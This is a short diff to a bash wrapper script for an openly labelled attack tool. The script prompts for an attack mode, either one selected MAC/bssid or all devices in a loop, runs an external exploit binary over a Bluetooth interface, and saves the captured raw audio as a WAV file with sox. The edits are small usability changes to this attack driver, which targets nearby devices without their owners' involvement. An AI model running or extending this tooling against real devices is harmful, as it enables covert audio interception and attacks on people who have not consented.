@@ -42,19 +42,20 @@ fi
 
 read -p "attack mode? (1: Attack selected mac | 2: Attack all): " attack_mode
 
-echo -e "\nAll outputs are stored in the output directory\n"
 
 
 if [ ${attack_mode} = "1" ]; then
+	read -p "bssid?: " bssid
 	rm -f "$output_raw"
 	./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$bssid"
 	if [ -f "$output_raw" ]; then
 		sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "${output_dir}/${output_wav}.wav"
-		echo "File saved to $output_wav"
+		echo "File saved to ${output_wav}.wav"
 	fi	
 	
 
 elif [ ${attack_mode} = "2" ]; then
+	echo -e "\nAll outputs are stored in the output directory\n"
 	counter=0
         echo "Press ctrl+z/ctrl+c to force-stop the attack"
         while true; do
